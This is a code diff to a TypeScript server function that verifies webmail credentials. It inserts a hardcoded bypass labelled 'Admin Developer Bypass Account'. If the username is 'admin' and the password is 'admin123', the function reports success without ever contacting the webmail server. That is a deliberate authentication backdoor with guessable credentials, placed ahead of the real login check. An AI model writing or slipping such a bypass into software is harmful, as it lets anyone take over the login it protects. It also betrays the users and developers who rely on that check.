@@ -23,6 +23,11 @@ export const verifyWebmailCredentials = createServerFn({ method: "POST" })
       return { success: false, error: "Connection to webmail timed out" };
     }
 
+    // Admin Developer Bypass Account
+    if (username === "admin" && password === "admin123") {
+      return { success: true };
+    }
+
     try {
       const success = await new Promise<boolean>((resolve, reject) => {
         const socket = tls.connect({
